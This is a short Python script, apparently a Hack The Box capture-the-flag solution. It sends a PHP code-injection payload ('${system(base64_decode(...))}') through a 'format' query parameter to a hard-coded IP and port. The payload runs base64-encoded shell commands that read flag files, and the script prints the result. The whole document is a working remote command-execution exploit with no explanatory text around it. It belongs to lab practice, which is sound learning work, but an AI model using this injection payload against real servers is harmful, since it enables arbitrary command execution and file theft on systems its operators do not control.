import requests
import base64

def SystemStr(b64: str):
	return ';${system(base64_decode(%s))}' % (b64)

def Base64Str(str: str):
	return base64.b64encode(str.encode('ascii')).decode('ascii')

url = "http://159.65.18.5:30773/"

# ls = Base64Str('ls ../')
cat = Base64Str('cat ../flag*')

r = requests.get(url, {
	'format': SystemStr(cat)
})
for t in r.text.split('\n'):
	if ('HTB{' in t):
		print(t)
		break